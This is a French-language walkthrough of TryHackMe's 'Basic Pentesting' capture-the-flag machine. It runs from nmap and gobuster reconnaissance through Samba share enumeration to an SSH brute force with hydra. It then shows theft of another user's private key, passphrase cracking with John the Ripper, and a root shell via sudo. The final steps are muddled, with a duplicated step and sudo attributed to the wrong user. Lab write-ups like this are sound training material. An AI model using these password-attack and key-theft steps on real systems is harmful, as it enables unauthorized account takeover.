### Étape 1: Reconnaissance

**Commande:**
```bash
nmap -sC -sV 10.10.56.151
```

**Explication:**
- `nmap` est un outil de reconnaissance réseau.
- `-sC` utilise des scripts par défaut pour effectuer des vérifications supplémentaires.
- `-sV` tente de déterminer les versions des services en cours d'exécution.
- Cette commande nous donne une vue d'ensemble des services disponibles sur la machine cible.

**Résultats:**
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
```
- On découvre des services comme SSH, HTTP, Samba et Apache Tomcat.

### Étape 2: Énumération

**Commande:**
```bash
gobuster dir -u http://10.10.56.151 -w /usr/share/wordlists/dirb/common.txt
```

**Explication:**
- `gobuster` est un outil de brute force pour découvrir des répertoires et des fichiers cachés sur un serveur web.
- `-u` spécifie l'URL cible.
- `-w` indique le chemin vers le fichier de wordlist.

**Résultats:**
```
/development (Status: 301)
```
- On découvre un répertoire `/development` sur le serveur web.

### Étape 3: Exploration de Répertoires

**Navigation vers le répertoire trouvé:**
- En visitant `http://10.10.56.151/development/`, on trouve deux fichiers : `dev.txt` et `j.txt`.

**Contenu de `dev.txt`:**
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K
2018-04-22: SMB has been configured. -K
2018-04-21: I got Apache set up. Will put in our content later. -J
```
**Contenu de `j.txt`:**
```
For J:
I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP.
-K
```
- On trouve des indices sur les utilisateurs potentiels `K` et `J`.

### Étape 4: Énumération des Partages Samba

**Commande:**
```bash
smbclient -L //10.10.56.151
```

**Explication:**
- `smbclient` permet d'interroger les partages disponibles sur un serveur Samba.

**Résultats:**
```
Sharename       Type      Comment
---------       ----      -------
Anonymous       Disk      
IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
```
- On découvre un partage anonyme.

### Étape 5: Accès au Partage Samba

**Commande:**
```bash
smbclient //10.10.56.151/Anonymous
```

**Explication:**
- Se connecter au partage Samba anonyme pour voir les fichiers disponibles.

**Résultats:**
```
smb: \> ls
  .                                   D        0  Thu Apr 19 18:31:20 2018
  ..                                  D        0  Thu Apr 19 18:13:06 2018
  staff.txt                           N      173  Thu Apr 19 18:29:55 2018
```
- On trouve un fichier `staff.txt`.

**Commande:**
```bash
get staff.txt
```

**Contenu de `staff.txt`:**
```
Announcement to staff:
PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)
-Kay
```
- On obtient un nom d'utilisateur complet: `jan`.

### Étape 6: Brute Force des Identifiants SSH

**Commande:**
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.56.151
```

**Explication:**
- `hydra` est un outil de force brute pour les services de connexion.
- `-l` spécifie le nom d'utilisateur.
- `-P` spécifie le chemin vers le fichier de wordlist.
- On attaque le service SSH.

### Étape 7: Connexion SSH

**Commande:**
```bash
ssh jan@10.10.56.151
```

**Explication:**
- Utiliser les identifiants trouvés pour se connecter au serveur via SSH.

### Étape 8 : Accès au Fichier de Kay et Crack de la Clé SSH

Je suis tombé sur un fichier `pass.bak` dans le répertoire de l'utilisateur `kay`, mais je n'avais pas les permissions nécessaires pour l'ouvrir. J'ai donc exploré d'autres moyens d'obtenir un accès en examinant le répertoire `.ssh` de `kay`.

### Exploration du Répertoire `.ssh`

**Commande:**
```bash
cd /home/kay/.ssh
ls
```

**Résultats:**
```
authorized_keys  id_rsa  id_rsa.pub
```

**Analyse:**
- **authorized_keys**: Contient les clés publiques autorisées pour se connecter au compte.
- **id_rsa**: Clé privée RSA, essentielle pour l'authentification SSH.
- **id_rsa.pub**: Clé publique associée à la clé privée `id_rsa`.

### Extraction de la Clé Privée

J'ai enregistré le contenu de `id_rsa` pour tenter de l'utiliser.

**Commande:**
```bash
cat id_rsa
```

**Résultats:**
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

...
-----END RSA PRIVATE KEY-----
```

### Sauvegarde de la Clé Privée

J'ai enregistré la clé privée dans un fichier nommé `key` sur ma machine locale.

### Décryptage de la Clé Privée

La clé privée était chiffrée, j'ai donc dû la décrypter pour l'utiliser. Pour cela, j'ai utilisé `ssh2john.py`, un script qui convertit la clé privée en un format crackable par `John the Ripper`.

**Commande:**
```bash
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
python ssh2john.py key > hash
```

**Explication:**
- `ssh2john.py` convertit la clé privée en un format hashé que `John the Ripper` peut utiliser pour la force brute.

### Crack de la Clé Privée avec John the Ripper

**Commande:**
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Explication:**
- `john` est un outil de force brute pour casser les mots de passe.
- `--wordlist` spécifie le fichier de mots de passe à utiliser pour la force brute.

**Résultats:**
```
beeswax          (key)
```

**Analyse:**
- Le mot de passe de la clé privée a été trouvé : `beeswax`.

### Utilisation de la Clé Privée Déchiffrée

Maintenant que j'avais le mot de passe de la clé, j'ai pu l'utiliser pour me connecter en tant que `kay`.

**Commande:**
```bash
ssh -i key kay@10.10.56.151
```

**Explication:**
- `-i` spécifie le fichier de clé privée à utiliser pour la connexion.

### Connexion Réussie

**Prompt:**
```
Enter passphrase for key 'key':
```

**Mot de passe:**
```
beeswax
```

**Résultats:**
```
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
kay@basic2:~$ 
```


En accédant au répertoire `.ssh` de `kay` et en trouvant la clé privée `id_rsa`, j'ai réussi à obtenir l'accès SSH à l'utilisateur `kay`. Ensuite, j'ai utilisé `ssh2john.py` pour convertir la clé privée en un format que `John the Ripper` peut décrypter. En cassant le mot de passe de la clé privée, j'ai pu me connecter en tant que `kay` et obtenir un accès plus élevé sur le système cible.

Cette méthode montre l'importance de sécuriser les clés privées SSH et de ne pas les laisser accessibles sans une protection appropriée, comme un mot de passe robuste.

### Étape 9: Exploration du Système

**Commande:**
```bash
sudo -l
```

**Explication:**
- Vérifier les permissions sudo de l'utilisateur `jan`.

### Étape 9: Élévation de Privilèges

**Commande:**
```bash
sudo su
```

**Explication:**
- Passer en utilisateur root si l'utilisateur `jan` a les permissions nécessaires.

### Conclusion

1. **Reconnaissance**: Utilisation de `nmap` pour découvrir les services disponibles.
2. **Énumération**: Utilisation de `gobuster` pour découvrir des répertoires cachés et de `smbclient` pour énumérer les partages Samba.
3. **Exploitation**: Force brute avec `hydra` pour trouver les identifiants SSH et accès au serveur via SSH.
4. **Post-Exploitation**: Vérification des permissions sudo et élévation de privilèges pour obtenir un accès root.

En suivant ces étapes, vous avez réussi à découvrir les vulnérabilités et à exploiter la machine cible dans le cadre du CTF Basic Pentesting de TryHackMe.